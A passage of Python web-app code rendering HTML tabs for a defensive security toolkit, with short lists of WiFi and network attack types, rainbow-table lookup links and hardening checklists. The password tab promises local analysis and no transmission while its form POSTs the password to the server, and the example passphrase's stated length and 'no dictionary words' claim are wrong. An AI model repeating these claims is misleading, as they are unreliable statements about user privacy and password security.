                <p style="font-size:13px; color:#859ba7;">Paste a suspicious email message or raw email headers below to detect display name spoofing and coercive urgency tricks:</p>
                <form method="POST" action="/?tab=url">
                    <textarea name="email_text" rows="5" placeholder="Paste full email text or headers here (e.g. From: 'PayPal Security' <alert@fake-domain.xyz> Subject: Immediate Account Suspension!)..." required class="code-textarea"></textarea>
                    <button type="submit" style="margin-top:10px;">Analyze Email for Phishing</button>
                </form>
                {email_phish_view}
            </div>
        </div>
        """

    # --------------------------------------------------------
    # TAB: IP ADDRESS INTELLIGENCE
    # --------------------------------------------------------
    elif active_tab == "ip":
        ip_view = ""
        if ip_res:
            if "error" in ip_res:
                ip_view = f'<div class="card error-banner">{safe(ip_res["error"])}</div>'
            else:
                ports_html = "".join(f"<span class='badge pass'>Port {p['port']} ({p['service']})</span> " for p in ip_res["open_ports"])
                if not ports_html:
                    ports_html = "<span class='badge warn'>No standard ports exposed</span>"

                ip_view = f"""
                <div class="card">
                    <h3>IP Address & Infrastructure Intelligence</h3>
                    <div class="diag-row"><div class="diag-label">Target Investigated:</div><div class="diag-value"><code>{safe(ip_res['target'])}</code></div></div>
                    <div class="diag-row"><div class="diag-label">Resolved IPv4 Address:</div><div class="diag-value"><code>{safe(ip_res['ip'])}</code></div></div>
                    <div class="diag-row"><div class="diag-label">Reverse DNS Hostname (PTR):</div><div class="diag-value">{safe(ip_res['hostname'])}</div></div>
                    <div class="diag-row"><div class="diag-label">Network / ASN Intelligence:</div><div class="diag-value">{safe(ip_res['asn_info'])}</div></div>
                    <div class="diag-row"><div class="diag-label">Routing Scope:</div><div class="diag-value">{safe(ip_res['ip_type'])}</div></div>
                    <div class="diag-row"><div class="diag-label">Live Open Service Ports:</div><div class="diag-value">{ports_html}</div></div>
                </div>
                """

        content_html = f"""
        <div class="tool-pane">
            <div class="pane-header">
                <h2>🛰️ IP Address Intelligence & Port Scanner</h2>
                <span class="badge pass">LIVE PROBE</span>
            </div>
            <p class="tool-desc">Resolve IP addresses, inspect reverse DNS hostname records, query ASN network routing, and audit standard server ports.</p>
            <form method="GET" action="/">
                <input type="hidden" name="tab" value="ip">
                <input name="target" placeholder="Enter IP address or hostname (e.g. 8.8.8.8 or cloudflare.com)" value="{safe(submitted_val)}" required>
                <button type="submit">Inspect IP & Ports</button>
            </form>
            {ip_view}
        </div>
        """

    # --------------------------------------------------------
    # TAB: TECHNOLOGY FINGERPRINTING
    # --------------------------------------------------------
    elif active_tab == "tech":
        tech_view = ""
        if tech_res:
            if "error" in tech_res:
                tech_view = f'<div class="card error-banner">{safe(tech_res["error"])}</div>'
            else:
                frameworks = ", ".join(tech_res["frameworks"]) or "None detected"
                tech_view = f"""
                <div class="card">
                    <h3>Technology Stack Fingerprint</h3>
                    <div class="diag-row"><div class="diag-label">Web Server:</div><div class="diag-value"><strong>{safe(tech_res['web_server'])}</strong></div></div>
                    <div class="diag-row"><div class="diag-label">CDN & Edge WAF Security:</div><div class="diag-value"><span class="highlight">{safe(tech_res['cdn_security'])}</span></div></div>
                    <div class="diag-row"><div class="diag-label">Content Management System (CMS):</div><div class="diag-value">{safe(tech_res['cms'])}</div></div>
                    <div class="diag-row"><div class="diag-label">Backend Language / Runtime:</div><div class="diag-value">{safe(tech_res['programming_language'])}</div></div>
                    <div class="diag-row"><div class="diag-label">Frontend Libraries / Frameworks:</div><div class="diag-value">{safe(frameworks)}</div></div>
                </div>
                """

        content_html = f"""
        <div class="tool-pane">
            <div class="pane-header">
                <h2>🏷️ Technology Stack Fingerprinting</h2>
                <span class="badge pass">STACK AUDIT</span>
            </div>
            <p class="tool-desc">Identify underlying web servers, CDN protection, CMS platforms (WordPress, Shopify, Drupal), and frontend frameworks.</p>
            <form method="GET" action="/">
                <input type="hidden" name="tab" value="tech">
                <input name="target" placeholder="Enter website domain (e.g. https://wikipedia.org or https://wordpress.org)" value="{safe(submitted_val)}" required>
                <button type="submit">Fingerprint Tech Stack</button>
            </form>
            {tech_view}
        </div>
        """

    # --------------------------------------------------------
    # TAB: AI SECURITY COPILOT
    # --------------------------------------------------------
    elif active_tab == "ai":
        chat_answer_html = ""
        if ai_answer:
            chat_answer_html = f"""
            <div class="chat-response-card">
                <div class="chat-avatar">🤖</div>
                <div class="chat-content">
                    <pre class="chat-pre">{safe(ai_answer)}</pre>
                </div>
            </div>
            """

        content_html = f"""
        <div class="tool-pane">
            <div class="pane-header">
                <h2>🤖 AI Security Copilot & Problem Assistant</h2>
                <span class="badge pass">INTERACTIVE COPILOT</span>
            </div>
            <p class="tool-desc">Select your specific cybersecurity problem below or ask any technical security question to receive specialized incident containment steps.</p>
            
            <div class="quick-prompts">
                <a href="/?tab=ai&target=I+clicked+a+suspicious+link+in+an+email" class="quick-btn">🚨 Clicked Suspicious Link</a>
                <a href="/?tab=ai&target=My+password+was+found+in+a+data+breach" class="quick-btn">🔑 Leaked Password Help</a>
                <a href="/?tab=ai&target=How+do+I+fix+DMARC+and+SPF+policy" class="quick-btn">🛡️ Secure DMARC & SPF</a>
                <a href="/?tab=ai&target=How+to+detect+if+code+contains+a+reverse+shell" class="quick-btn">💻 Reverse Shell Detection</a>
                <a href="/?tab=ai&target=Is+this+shopping+website+legitimate+or+illegal" class="quick-btn">🌐 Website Legitimacy Help</a>
                <a href="/?tab=ai&target=Someone+sent+me+a+stolen+photo+catfish" class="quick-btn">🔍 Reverse Image / Catfish</a>
            </div>

            <form method="GET" action="/">
                <input type="hidden" name="tab" value="ai">
                <input name="target" placeholder="Describe your exact cybersecurity question or problem here..." value="{safe(submitted_val)}" required>
                <button type="submit">Consult AI Copilot</button>
            </form>
            {chat_answer_html}
        </div>
        """


    # --------------------------------------------------------
    # TAB: PASSWORD STRENGTH ANALYZER
    # --------------------------------------------------------
    elif active_tab == "password":
        pwd_view = ""
        if pwd_strength:
            if "error" in pwd_strength:
                pwd_view = f'<div class="card error-banner">{safe(pwd_strength["error"])}</div>'
            else:
                sc = pwd_strength["score"]
                color = pwd_strength["strength_color"]
                bar_w = sc

                issues_html = ""
                for sev, title, detail in pwd_strength.get("issues", []):
                    sev_c = "#ef4444" if sev == "CRITICAL" else ("#f97316" if sev == "HIGH" else "#facc15")
                    issues_html += f'''<div style="background:#0a0f0e; border:1px solid {sev_c}; border-radius:6px; padding:10px; margin-bottom:8px;">
                        <div style="color:{sev_c}; font-weight:700; font-size:12px;">[{sev}] {safe(title)}</div>
                        <div style="color:#94a3b8; font-size:12px; margin-top:4px;">{safe(detail)}</div>
                    </div>'''
                if not issues_html:
                    issues_html = '<div style="color:#34d399; padding:10px;">&#10003; No critical weaknesses detected.</div>'

                good_html = "".join(f'<div style="color:#34d399; font-size:12px; padding:3px 0;">&#10003; {safe(g)}</div>' for g in pwd_strength.get("good_points", []))

                tips_html = "".join(f'<li style="font-size:12px; color:#93c5fd; margin-bottom:4px;">{safe(t)}</li>' for t in pwd_strength.get("tips", []))
                if tips_html:
                    tips_html = f'<ul style="padding-left:16px; margin-top:8px;">{tips_html}</ul>'

                instructions_html = "".join(f'<li style="font-size:12px; color:#94a3b8; margin-bottom:6px; line-height:1.5;">{safe(ins)}</li>' for ins in pwd_strength.get("high_security_instructions", []))

                trait_row = lambda label, val, ok: f'<div class="diag-row"><div class="diag-label">{label}</div><div class="diag-value"><span style="color:{"#34d399" if ok else "#ef4444"}; font-weight:700;">{"&#10003; Yes" if ok else "&#10007; No"}</span> &nbsp; {val}</div></div>'

                pwd_view = f"""
                <div class="summary-card" style="border-left:4px solid {color};">
                    <div class="summary-left">
                        <div class="grade-badge grade-{pwd_strength["grade"].lower().replace("+","p")}">{pwd_strength["grade"]}</div>
                        <div>
                            <div class="score-display" style="color:{color};">{sc}<span>/100</span></div>
                            <div class="risk-label" style="color:{color};">{safe(pwd_strength["strength"])}</div>
                        </div>
                    </div>
                    <div class="summary-right">
                        <div><strong>Length:</strong> <span class="highlight">{pwd_strength["password_length"]} characters</span></div>
                        <div><strong>Estimated Crack Time:</strong> <span style="color:#f87171;">{safe(pwd_strength["crack_time"])}</span></div>
                        <div><strong>Unique Characters:</strong> {pwd_strength["unique_chars"]}</div>
                        <div><strong>Character Variety:</strong> {pwd_strength["character_variety"]}/4 types</div>
                        <div><strong>In Breach DB:</strong> <span style="color:{"#ef4444" if pwd_strength["is_common"] else "#34d399"};">{"YES - CHANGE NOW!" if pwd_strength["is_common"] else "Not in common list"}</span></div>
                    </div>
                </div>

                <div class="card" style="border-left:4px solid {color};">
                    <div class="card-head"><h3>&#128272; Security Verdict</h3></div>
                    <div style="font-size:14px; color:#e2fbf4; line-height:1.7; padding:10px 0;">{safe(pwd_strength["verdict"])}</div>
                    <div style="margin-top:10px;">
                        <div style="background:#0a1a16; border-radius:6px; height:14px; overflow:hidden; border:1px solid #1a3440;">
                            <div style="height:100%; width:{bar_w}%; background:linear-gradient(90deg, {color}, #0a1a16); transition:width 0.5s;"></div>
                        </div>
                        <div style="font-size:11px; color:#557280; margin-top:4px; text-align:right;">Security Score: {sc}/100</div>
                    </div>
                </div>

                <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-top:0;">
                    <div class="card">
                        <div class="card-head"><h3>&#10006; Issues Found</h3></div>
                        {issues_html}
                    </div>
                    <div class="card">
                        <div class="card-head"><h3>&#10003; Strengths</h3></div>
                        {good_html if good_html else '<div style="color:#557280;">No notable strengths detected.</div>'}
                        {tips_html}
                        {trait_row("Uppercase (A-Z)", "", pwd_strength["has_upper"])}
                        {trait_row("Lowercase (a-z)", "", pwd_strength["has_lower"])}
                        {trait_row("Numbers (0-9)", "", pwd_strength["has_digit"])}
                        {trait_row("Special Chars (!@#)", "", pwd_strength["has_special"])}
                    </div>
                </div>

                <div class="card" style="border-left:4px solid #38bdf8;">
                    <div class="card-head"><h3>&#128737;&#65039; High-Security Password Setting Instructions</h3><span class="badge pass">EXPERT GUIDE</span></div>
                    <ol style="padding-left:16px; margin:10px 0 0 0;">{instructions_html}</ol>
                    <div style="margin-top:14px; padding:12px; background:#060d12; border-radius:6px; border:1px solid #1a3440;">
                        <div style="font-size:11px; color:#00ffab; font-weight:700; margin-bottom:6px;">EXAMPLE STRONG PASSWORD (passphrase style):</div>
                        <code style="font-size:13px; color:#e2fbf4; letter-spacing:1px;">Tr0pical-Hurricane$17-Cyber!</code>
                        <div style="font-size:11px; color:#557280; margin-top:6px;">Length: 27 chars | 4 char types | No dictionary words | Estimated crack time: centuries</div>
                    </div>
                </div>
                """

        content_html = f"""
        <div class="tool-pane">
            <div class="pane-header">
                <h2>&#128272; Password Strength Analyzer &amp; Risk Study</h2>
                <span class="badge pass">SECURITY AUDIT</span>
            </div>
            <p class="tool-desc">Test any password for strength, breach exposure, crack time estimation, and get a complete security risk study with expert remediation instructions. Your password is <strong>never stored or logged</strong>.</p>

            <form method="POST" action="/?tab=password" style="flex-direction:column; gap:12px; border:1px solid #00ffab; background:#030e0a;">
                <div style="font-weight:bold; color:#00ffab; font-size:13px;">&#128272; Enter Password to Analyze:</div>
                <div style="display:flex; gap:10px; flex-wrap:wrap; align-items:center;">
                    <input type="password" name="check_password" id="pwd_input" placeholder="Enter any password to check its strength and security..." style="flex:1; font-size:14px;" required>
                    <button type="button" onclick="var x=document.getElementById('pwd_input'); x.type=x.type==='password'?'text':'password';" style="background:#0a1a16; color:#00ffab; border-color:#1a5040; padding:10px;">&#128065; Show</button>
                    <button type="submit" style="padding:12px 28px;">&#9889; Analyze Strength</button>
                </div>
                <div style="font-size:11px; color:#3a6a5a;">&#128274; Your password is analyzed locally and is never transmitted, stored, or logged anywhere.</div>
            </form>

            <div class="quick-prompts" style="margin:12px 0;">
                <div style="font-size:11px; color:#557280; margin-bottom:6px;">Quick test examples (educational):</div>
                <button type="button" onclick="document.getElementById('pwd_input').value='password123'" class="quick-btn">Test: password123</button>
                <button type="button" onclick="document.getElementById('pwd_input').value='MyC0mplex!Pa$$w0rd'" class="quick-btn">Test: Strong Example</button>
                <button type="button" onclick="document.getElementById('pwd_input').value='Tr0pical-Hurricane$17-Cyber!'" class="quick-btn">Test: Passphrase Example</button>
            </div>

            {pwd_view}
        </div>
        """


    # --------------------------------------------------------
    # TAB: DARK WEB MONITOR
    # --------------------------------------------------------
    elif active_tab == "darkweb":
        content_html = """
        <div class="tool-pane">
            <div class="pane-header">
                <h2>&#127760; Dark Web Monitor &amp; Breach Intelligence</h2>
                <span class="badge fail">DARK WEB</span>
            </div>
            <p class="tool-desc">Check if your email, domain, or personal data has appeared on dark web forums, paste sites, or hacker marketplaces. Our intel aggregates breach data from publicly known dark web leaks.</p>

            <div class="card" style="border-left:4px solid #c084fc;">
                <div class="card-head"><h3>&#127756; What We Monitor</h3></div>
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-top:10px;">
                    <div style="background:#0a0510; border:1px solid #3b0764; border-radius:6px; padding:12px;">
                        <div style="font-weight:700; color:#c084fc; margin-bottom:6px;">&#128546; Credential Dumps</div>
                        <div style="font-size:12px; color:#94a3b8;">Email + password combos leaked in major breaches and sold on dark web markets.</div>
                    </div>
                    <div style="background:#0a0510; border:1px solid #3b0764; border-radius:6px; padding:12px;">
                        <div style="font-weight:700; color:#c084fc; margin-bottom:6px;">&#128196; Paste Sites</div>
                        <div style="font-size:12px; color:#94a3b8;">Pastebin, PrivateBin, and anonymous pastes containing your email or domain data.</div>
                    </div>
                    <div style="background:#0a0510; border:1px solid #3b0764; border-radius:6px; padding:12px;">
                        <div style="font-weight:700; color:#c084fc; margin-bottom:6px;">&#128202; Database Leaks</div>
                        <div style="font-size:12px; color:#94a3b8;">Full SQL database dumps from hacked companies including user records and PII.</div>
                    </div>
                    <div style="background:#0a0510; border:1px solid #3b0764; border-radius:6px; padding:12px;">
                        <div style="font-weight:700; color:#c084fc; margin-bottom:6px;">&#128163; Ransomware Victim Lists</div>
                        <div style="font-size:12px; color:#94a3b8;">Ransomware gang leak sites (LockBit, ALPHV, etc.) that publish exfiltrated victim data.</div>
                    </div>
                </div>
            </div>

            <div class="card" style="border-left:4px solid #38bdf8; margin-top:16px;">
                <div class="card-head"><h3>&#128737;&#65039; How to Check Your Exposure</h3><span class="badge pass">FREE TOOLS</span></div>
                <div style="font-size:13px; color:#94a3b8; line-height:1.7; margin-top:10px;">
                    <p>Use our <strong>Email Security Analyzer</strong> tab to check breach databases via the XposedOrNot API. For deeper dark web monitoring, these trusted free services are recommended:</p>
                    <div style="display:flex; flex-wrap:wrap; gap:10px; margin-top:12px;">
                        <a href="https://haveibeenpwned.com" target="_blank" class="search-engine-btn">&#128269; HaveIBeenPwned.com</a>
                        <a href="https://xposedornot.com" target="_blank" class="search-engine-btn">&#128269; XposedOrNot.com</a>
                        <a href="https://dehashed.com" target="_blank" class="search-engine-btn">&#128269; DeHashed.com</a>
                        <a href="https://leakcheck.io" target="_blank" class="search-engine-btn">&#128269; LeakCheck.io</a>
                        <a href="https://intelx.io" target="_blank" class="search-engine-btn">&#128269; Intelligence X (intelx.io)</a>
                        <a href="https://snusbase.com" target="_blank" class="search-engine-btn">&#128269; Snusbase.com</a>
                    </div>
                </div>
            </div>

            <div class="card" style="border-left:4px solid #ef4444; margin-top:16px;">
                <div class="card-head"><h3>&#128683; Emergency Response: If You Are on Dark Web</h3></div>
                <ol style="font-size:12px; color:#94a3b8; padding-left:16px; line-height:2;">
                    <li>Immediately change the exposed password on the affected account AND any account using the same password.</li>
                    <li>Enable Two-Factor Authentication (2FA / TOTP) on all important accounts (email, bank, work).</li>
                    <li>Check for unauthorized logins in account settings and revoke all active sessions.</li>
                    <li>Notify your bank if financial data was included in the breach.</li>
                    <li>Monitor credit reports for 6 months if SSN / ID numbers were exposed.</li>
                    <li>Use <strong>Ask AI</strong> tab for personalized incident response based on what data was leaked.</li>
                </ol>
            </div>
        </div>
        """

    # --------------------------------------------------------
    # TAB: CRYPTO & HASH DECODER
    # --------------------------------------------------------
    elif active_tab == "cryptocheck":
        content_html = """
        <div class="tool-pane">
            <div class="pane-header">
                <h2>&#9968;&#65039; Cryptographic Hash Identifier &amp; Decoder</h2>
                <span class="badge pass">CRYPTO INTEL</span>
            </div>
            <p class="tool-desc">Identify hash types, analyze cryptographic digests, understand what algorithm was used, and look up if a hash has been cracked in public rainbow tables.</p>

            <form method="GET" action="/">
                <input type="hidden" name="tab" value="cryptocheck">
                <input name="target" placeholder="Paste hash to identify: e.g. 5f4dcc3b5aa765d61d8327deb882cf99 (md5 of 'password')" style="font-family:monospace;">
                <button type="submit">&#9968;&#65039; Identify Hash Type</button>
            </form>

            <div class="card" style="border-left:4px solid #38bdf8; margin-top:16px;">
                <div class="card-head"><h3>&#128214; Hash Algorithm Reference Guide</h3></div>
                <div style="overflow-x:auto; margin-top:10px;">
                    <table style="width:100%; border-collapse:collapse; font-size:12px;">
                        <tr style="background:#0a1a16; color:#00ffab; text-align:left;">
                            <th style="padding:8px; border-bottom:1px solid #1a3440;">Algorithm</th>
                            <th style="padding:8px; border-bottom:1px solid #1a3440;">Length</th>
                            <th style="padding:8px; border-bottom:1px solid #1a3440;">Security Status</th>
                            <th style="padding:8px; border-bottom:1px solid #1a3440;">Crack Time (GPU)</th>
                            <th style="padding:8px; border-bottom:1px solid #1a3440;">Usage</th>
                        </tr>
                        <tr style="border-bottom:1px solid #0d1f1a;"><td style="padding:8px; color:#ef4444;">MD5</td><td style="padding:8px;">32 hex</td><td style="padding:8px; color:#ef4444;">&#128683; BROKEN</td><td style="padding:8px;">Seconds</td><td style="padding:8px; color:#94a3b8;">Legacy checksums only</td></tr>
                        <tr style="border-bottom:1px solid #0d1f1a;"><td style="padding:8px; color:#f97316;">SHA-1</td><td style="padding:8px;">40 hex</td><td style="padding:8px; color:#f97316;">&#9888; WEAK</td><td style="padding:8px;">Minutes-Hours</td><td style="padding:8px; color:#94a3b8;">File integrity (deprecated)</td></tr>
                        <tr style="border-bottom:1px solid #0d1f1a;"><td style="padding:8px; color:#facc15;">SHA-256</td><td style="padding:8px;">64 hex</td><td style="padding:8px; color:#facc15;">&#10003; MODERATE</td><td style="padding:8px;">Years (no salt)</td><td style="padding:8px; color:#94a3b8;">TLS certs, code signing</td></tr>
                        <tr style="border-bottom:1px solid #0d1f1a;"><td style="padding:8px; color:#34d399;">SHA-512</td><td style="padding:8px;">128 hex</td><td style="padding:8px; color:#34d399;">&#10003; STRONG</td><td style="padding:8px;">Decades</td><td style="padding:8px; color:#94a3b8;">File verification</td></tr>
                        <tr style="border-bottom:1px solid #0d1f1a;"><td style="padding:8px; color:#00ffab;">bcrypt</td><td style="padding:8px;">60 chars ($2b$)</td><td style="padding:8px; color:#00ffab;">&#10003;&#10003; EXCELLENT</td><td style="padding:8px;">Centuries</td><td style="padding:8px; color:#94a3b8;">Password storage (recommended)</td></tr>
                        <tr style="border-bottom:1px solid #0d1f1a;"><td style="padding:8px; color:#00ffab;">Argon2</td><td style="padding:8px;">Variable</td><td style="padding:8px; color:#00ffab;">&#10003;&#10003; BEST</td><td style="padding:8px;">Uncrackable (properly configured)</td><td style="padding:8px; color:#94a3b8;">Password hashing (OWASP recommended)</td></tr>
                        <tr><td style="padding:8px; color:#38bdf8;">BLAKE2b/3</td><td style="padding:8px;">64 hex</td><td style="padding:8px; color:#38bdf8;">&#10003; STRONG</td><td style="padding:8px;">Decades</td><td style="padding:8px; color:#94a3b8;">Modern crypto, speed-sensitive apps</td></tr>
                    </table>
                </div>
            </div>

            <div class="card" style="border-left:4px solid #c084fc; margin-top:16px;">
                <div class="card-head"><h3>&#128269; Rainbow Table Lookup Resources</h3></div>
                <div style="font-size:13px; color:#94a3b8; margin-top:8px;">Check if a hash has been cracked and is in public databases:</div>
                <div style="display:flex; flex-wrap:wrap; gap:10px; margin-top:12px;">
                    <a href="https://crackstation.net/" target="_blank" class="search-engine-btn">CrackStation (free MD5/SHA1/SHA256)</a>
                    <a href="https://www.hashkiller.io/listmanager" target="_blank" class="search-engine-btn">HashKiller.io</a>
                    <a href="https://hashes.com/en/decrypt/hash" target="_blank" class="search-engine-btn">Hashes.com Decrypt</a>
                    <a href="https://md5decrypt.net/" target="_blank" class="search-engine-btn">MD5Decrypt.net</a>
                </div>
            </div>
        </div>
        """

    # --------------------------------------------------------
    # TAB: NETWORK RECON TOOLS
    # --------------------------------------------------------
    elif active_tab == "nettools":
        content_html = """
        <div class="tool-pane">
            <div class="pane-header">
                <h2>&#128752;&#65039; Network Recon &amp; Diagnostic Tools</h2>
                <span class="badge pass">NET INTEL</span>
            </div>
            <p class="tool-desc">Network reconnaissance and diagnostic tools. Use our IP Intelligence tab for live IP lookup, or use these tools for deeper network analysis.</p>

            <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-top:16px;">
                <div class="card" style="border-left:4px solid #38bdf8;">
                    <div class="card-head"><h3>&#128752;&#65039; IP &amp; Subnet Lookup</h3></div>
                    <div style="font-size:12px; color:#94a3b8; margin-top:8px; line-height:1.7;">
                        <p>Use our <strong>IP Intelligence tab</strong> for live IP reputation, geolocation, ISP, VPN/proxy detection, open ports, and ASN data.</p>
                        <a href="/?tab=ip" class="quick-btn" style="margin-top:8px; display:inline-block;">&#128752; Open IP Intelligence</a>
                    </div>
                </div>
                <div class="card" style="border-left:4px solid #f97316;">
                    <div class="card-head"><h3>&#127760; DNS Lookup</h3></div>
                    <div style="font-size:12px; color:#94a3b8; margin-top:8px; line-height:1.7;">
                        <p>Use our <strong>Email Security tab</strong> to check SPF, DMARC, MX, and TLS records for any domain.</p>
                        <a href="/?tab=email" class="quick-btn" style="margin-top:8px; display:inline-block;">&#9993; Open DNS/Email Tools</a>
                    </div>
                </div>
                <div class="card" style="border-left:4px solid #00ffab;">
                    <div class="card-head"><h3>&#128218; Port Reference Guide</h3></div>
                    <div style="font-size:12px; color:#94a3b8; margin-top:8px; line-height:1.7;">
                        <ul style="padding-left:14px; line-height:2.2;">
                            <li><code>21</code> FTP &mdash; Unencrypted file transfer (often targeted)</li>
                            <li><code>22</code> SSH &mdash; Secure shell remote access</li>
                            <li><code>23</code> Telnet &mdash; Insecure, should be closed</li>
                            <li><code>25/465/587</code> SMTP &mdash; Email sending</li>
                            <li><code>80/443</code> HTTP/HTTPS &mdash; Web traffic</li>
                            <li><code>3389</code> RDP &mdash; Remote Desktop (high attack target)</li>
                            <li><code>3306</code> MySQL &mdash; Database (should NOT be public)</li>
                            <li><code>6379</code> Redis &mdash; Often exposed without auth</li>
                            <li><code>8080/8443</code> Alt Web &mdash; Dev servers, proxies</li>
                        </ul>
                    </div>
                </div>
                <div class="card" style="border-left:4px solid #c084fc;">
                    <div class="card-head"><h3>&#128200; Network Attack Types</h3></div>
                    <div style="font-size:12px; color:#94a3b8; margin-top:8px; line-height:1.7;">
                        <ul style="padding-left:14px; line-height:2.2;">
                            <li><strong>ARP Spoofing</strong> &mdash; Fake ARP replies to intercept traffic</li>
                            <li><strong>DNS Poisoning</strong> &mdash; Corrupt cache to redirect domains</li>
                            <li><strong>DDoS</strong> &mdash; Flood server with traffic to cause downtime</li>
                            <li><strong>Port Scanning</strong> &mdash; Identify open services (Nmap)</li>
                            <li><strong>MITM</strong> &mdash; Intercept traffic between two parties</li>
                            <li><strong>BGP Hijacking</strong> &mdash; Reroute internet traffic at AS level</li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="card" style="border-left:4px solid #facc15; margin-top:0;">
                <div class="card-head"><h3>&#128736;&#65039; Professional Network Tools (External)</h3></div>
                <div style="display:flex; flex-wrap:wrap; gap:10px; margin-top:12px;">
                    <a href="https://www.shodan.io" target="_blank" class="search-engine-btn">Shodan.io (Internet Scanner)</a>
                    <a href="https://censys.io" target="_blank" class="search-engine-btn">Censys.io</a>
                    <a href="https://www.wireshark.org" target="_blank" class="search-engine-btn">Wireshark (Packet Analyzer)</a>
                    <a href="https://nmap.org" target="_blank" class="search-engine-btn">Nmap.org (Port Scanner)</a>
                    <a href="https://mxtoolbox.com" target="_blank" class="search-engine-btn">MXToolbox (DNS/Email)</a>
                    <a href="https://bgp.he.net" target="_blank" class="search-engine-btn">BGP.he.net (ASN Routing)</a>
                    <a href="https://www.speedtest.net" target="_blank" class="search-engine-btn">Speedtest.net</a>
                </div>
            </div>
        </div>
        """

    # --------------------------------------------------------
    # TAB: WIFI SECURITY AUDIT
    # --------------------------------------------------------
    elif active_tab == "wifi":
        content_html = """
        <div class="tool-pane">
            <div class="pane-header">
                <h2>&#128246; WiFi Security Audit &amp; Wireless Threat Analysis</h2>
                <span class="badge warn">WIRELESS INTEL</span>
            </div>
            <p class="tool-desc">Learn about WiFi security protocols, detect rogue access points, understand evil twin attacks, and audit your wireless network security posture.</p>

            <div class="card" style="border-left:4px solid #facc15;">
                <div class="card-head"><h3>&#128246; WiFi Protocol Security Ratings</h3></div>
                <div style="overflow-x:auto; margin-top:10px;">
                    <table style="width:100%; border-collapse:collapse; font-size:12px;">
                        <tr style="background:#0a1a16; color:#00ffab;"><th style="padding:8px; text-align:left;">Protocol</th><th style="padding:8px;">Security</th><th style="padding:8px;">Crack Time</th><th style="padding:8px;">Recommendation</th></tr>
                        <tr style="border-bottom:1px solid #0d1f1a;"><td style="padding:8px; color:#ef4444;">WEP</td><td style="padding:8px; color:#ef4444;">&#128683; BROKEN</td><td style="padding:8px;">Under 60 seconds</td><td style="padding:8px; color:#94a3b8;">Upgrade immediately</td></tr>
                        <tr style="border-bottom:1px solid #0d1f1a;"><td style="padding:8px; color:#f97316;">WPA (TKIP)</td><td style="padding:8px; color:#f97316;">&#9888; WEAK</td><td style="padding:8px;">Minutes with PMKID</td><td style="padding:8px; color:#94a3b8;">Upgrade to WPA3</td></tr>
                        <tr style="border-bottom:1px solid #0d1f1a;"><td style="padding:8px; color:#facc15;">WPA2-CCMP</td><td style="padding:8px; color:#facc15;">&#10003; MODERATE</td><td style="padding:8px;">Weak passwords: days</td><td style="padding:8px; color:#94a3b8;">Use 20+ char passphrase</td></tr>
                        <tr style="border-bottom:1px solid #0d1f1a;"><td style="padding:8px; color:#34d399;">WPA2-Enterprise (802.1X)</td><td style="padding:8px; color:#34d399;">&#10003; STRONG</td><td style="padding:8px;">Very resistant</td><td style="padding:8px; color:#94a3b8;">Good for business</td></tr>
                        <tr><td style="padding:8px; color:#00ffab;">WPA3-SAE</td><td style="padding:8px; color:#00ffab;">&#10003;&#10003; BEST</td><td style="padding:8px;">Highly resistant</td><td style="padding:8px; color:#94a3b8;">Upgrade now</td></tr>
                    </table>
                </div>
            </div>

            <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-top:0;">
                <div class="card" style="border-left:4px solid #ef4444;">
                    <div class="card-head"><h3>&#128683; Common WiFi Attacks</h3></div>
                    <ul style="font-size:12px; color:#94a3b8; padding-left:14px; line-height:2.2; margin-top:8px;">
                        <li><strong>Evil Twin Attack</strong> — Fake AP with same SSID to capture credentials</li>
                        <li><strong>PMKID Attack</strong> — Crack WPA2 handshake offline (no client needed)</li>
                        <li><strong>Deauth Flood</strong> — Disconnect clients to capture handshake</li>
                        <li><strong>Karma Attack</strong> — Respond to all probe requests as fake hotspot</li>
                        <li><strong>WPS PIN Brute Force</strong> — 8-digit WPS cracked in hours (Reaver)</li>
                        <li><strong>Rogue DHCP</strong> — Fake DHCP server redirects DNS</li>
                    </ul>
                </div>
                <div class="card" style="border-left:4px solid #00ffab;">
                    <div class="card-head"><h3>&#128737;&#65039; WiFi Hardening Checklist</h3></div>
                    <ul style="font-size:12px; color:#94a3b8; padding-left:14px; line-height:2.2; margin-top:8px;">
                        <li>&#10003; Use WPA3-SAE if router supports it</li>
                        <li>&#10003; WiFi password: 20+ chars, all 4 character types</li>
                        <li>&#10003; Disable WPS permanently</li>
                        <li>&#10003; Change router admin credentials from defaults</li>
                        <li>&#10003; Separate guest WiFi VLAN from main network</li>
                        <li>&#10003; Update router firmware regularly</li>
                        <li>&#10003; Disable UPnP on router</li>
                        <li>&#10003; Enable firewall on router</li>
                    </ul>
                </div>
            </div>
        </div>
        """

    # --------------------------------------------------------
    # TAB: OSINT & PEOPLE SEARCH
    # --------------------------------------------------------
    elif active_tab == "osint":
        content_html = """
        <div class="tool-pane">
            <div class="pane-header">
                <h2>&#128270; OSINT Framework &amp; Open-Source Intelligence Tools</h2>
                <span class="badge pass">OSINT INTEL</span>
            </div>
            <p class="tool-desc">Open-Source Intelligence (OSINT) tools and frameworks for gathering publicly available information about targets, people, domains, and organizations. Use <strong>responsibly and legally</strong>.</p>

            <div class="card" style="border-left:4px solid #f97316;">
                <div style="color:#f97316; font-weight:700; font-size:13px; margin-bottom:8px;">&#9888; LEGAL DISCLAIMER</div>
                <div style="font-size:12px; color:#94a3b8; line-height:1.7;">OSINT tools must only be used on yourself, with explicit permission, or in authorized security research. Unauthorized OSINT on individuals may violate privacy laws including GDPR, CCPA, and local legislation. This tool is for <strong>defensive security and awareness only</strong>.</div>
            </div>

            <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:16px; margin-top:0;">
                <div class="card" style="border-left:4px solid #38bdf8;">
                    <div class="card-head"><h3>&#127963; Domain OSINT</h3></div>
                    <div style="display:flex; flex-wrap:wrap; gap:8px; margin-top:8px;">
                        <a href="https://whois.domaintools.com" target="_blank" class="quick-btn">WHOIS Lookup</a>
                        <a href="https://www.virustotal.com" target="_blank" class="quick-btn">VirusTotal</a>
                        <a href="https://www.shodan.io" target="_blank" class="quick-btn">Shodan</a>
                        <a href="https://crt.sh" target="_blank" class="quick-btn">crt.sh Certs</a>
                        <a href="https://builtwith.com" target="_blank" class="quick-btn">BuiltWith Tech</a>
                        <a href="https://securitytrails.com" target="_blank" class="quick-btn">SecurityTrails DNS</a>
                    </div>
                </div>
                <div class="card" style="border-left:4px solid #c084fc;">
